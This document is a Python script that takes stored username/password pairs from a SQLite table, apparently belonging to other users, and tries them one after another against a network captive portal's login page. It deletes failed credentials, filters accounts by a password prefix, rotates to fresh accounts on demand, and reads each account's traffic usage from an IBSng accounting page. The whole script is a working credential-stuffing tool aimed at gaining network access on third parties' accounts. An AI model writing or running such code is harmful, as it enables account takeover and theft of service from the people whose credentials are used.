import requests
import time
import html2text
import os
import sqlite3
current_file_path = __file__
current_file_dir = os.path.dirname(__file__)
dbfile = os.path.join(current_file_dir,'requests/dtbs/datatab.db')
username,password,usage,traffic,c,logc = 12345678,12345678,0,0,0,0
db = sqlite3.connect(dbfile)
db.row_factory = sqlite3.Row
def deletethis():
    global username
    print('Deleting this one...')
    #time.sleep(0.1)
    db.execute('delete from login where username={}'.format(username))
    db.commit()
def dbcount():
    dn=0
    tableall = db.execute('select * from login')
    for each in tableall:
        dn += 1
    print('Accounts in Database: {}'.format(dn))
def checkuserpass():
    global username,password
    try:
        proxies = {"http": "127.0.0.1:8080"}
        log = requests.get('http://172.16.254.2/status', proxies=proxies)
        html = html2text.html2text(log.text)
        if username in html:
            return 1
        else:
            return 0
    except:
            print('Cant Connect to Login Server!')
            time.sleep(2)
def confirm():

    try:
        proxies = {"http": "127.0.0.1:8080"}
        log = requests.get('http://172.16.254.2/login', proxies=proxies)
        html = html2text.html2text(log.text)
        check = checkuserpass()
        if check == 1:
            if "If nothing happens," in html:
                proxies = {"http": "127.0.0.1:8080"}
                log = requests.get('http://172.16.254.2/login', proxies=proxies)
                html = html2text.html2text(log.text)
                info()
                try:
                    print('3')
                    time.sleep(1)
                    print('2')
                    time.sleep(1)
                    print('1')
                    time.sleep(1)

                except:
                    print('Loging Out')
                    try:
                        proxies = {"http": "127.0.0.1:8080"}
                        logout = requests.get('http://172.16.254.2/logout', proxies=proxies)
                    except:
                        print('Cant Connect to Login Server!')
                    print('Chang Account...')
                    os.system('cls')
                    test()
            else:
                test()
        else:
                print('Username and Password is not match!\nTry to log out and login with new account!')
                time.sleep(2)
                try:
                    proxies = {"http": "127.0.0.1:8080"}
                    logout = requests.get('http://172.16.254.2/logout', proxies=proxies)
                    test()
                except:
                    print('Cant Connect to Login Server!')
    except:
            print('Cant Connect to Login Server!')
            time.sleep(2)
def info():
    global username,password,usage,traffic
    infodata = {'normal_username': username, 'normal_password': password}
    try:
        proxies = {"http": "127.0.0.1:8080"}
        inforeq = requests.post('http://172.16.16.1/IBSng/user/', data=infodata, proxies=proxies)
        html = html2text.html2text(inforeq.text)
        for line in html.split("\n"):
            if "This" in line:
                usage = line.split("|")
                print(usage[1],usage[2])
     #       if "Monthly Traffic Limit" in line:
     #           traffic = line.split('|')
     #           print (traffic[1],traffic[2])
    except:
        print('Cant Connect to Login Server!')
def getup():
    global username,password,logc
    table = db.execute('SELECT * FROM login ORDER BY RANDOM() LIMIT 1')
    for each in table:
        username = each['username']
        password = each['password']
    global c
    c += 1
    dbcount()
    print("Try to Login... [{}]".format(username[:5]))
    print('Try Count: ', c)
    print('Logged Count: ', logc)
    if password[:3] == "136":
        return username,password
    else:
        print ("\nFailed!\nReason: Not Tabrizian!\n####################\n\n\n")
        deletethis()
        #time.sleep(0.2)
        os.system('cls')
    return 0,0
def login():
    html = 'Cant Connect to Login Server!'
    username,password=getup()
    while (username == 0):
        username,password=getup()

    data = {'username': username, 'password': password}
    while (html == 'Cant Connect to Login Server!'):
        try:
            proxies = {"http": "127.0.0.1:8080"}
            r = requests.post('http://172.16.254.2/login', data=data, proxies=proxies)
            import html2text
            html = html2text.html2text(r.text)
        except:
            print('Cant Connect to Login Server!')
            time.sleep(2)
    return html
def test():
    html=login()
    global logc
    if "Wrong password" in html:
        print("\nFailed!\nReason: Wrong Password\n####################\n\n\n")
        deletethis()
        os.system('cls')
        test()
    if "Maximum number of concurrent logins reached" in html:
        print("Failed!\nReason: Max Number\n####################\n\n\n")
        #time.sleep(0.2)
        os.system('cls')
        test()

    if "does not exists" in html:
        print("\nFailed!\nReason: This username does not exists\n####################\n\n\nTry Again...")
        deletethis()
        os.system('cls')
        test()
    if "User Traffic quota has exceeded" in html:
        print("\nFailed!\nReason: User Traffic quota has exceeded\n####################\n\n\nTry Again...")
        #time.sleep(0.2)
        os.system('cls')
        test()
    if "If nothing happens," in html:
        print("\n\n\n##################################################")
        print("################>  Logged IN!!  <#################")
        print("##################################################")
        print(" You can Change this Account by Pressing Ctrl + C")
        print("##################################################\n\n\n")
        logc+=1
        info()
        time.sleep(0.5)    # pause
        confirm()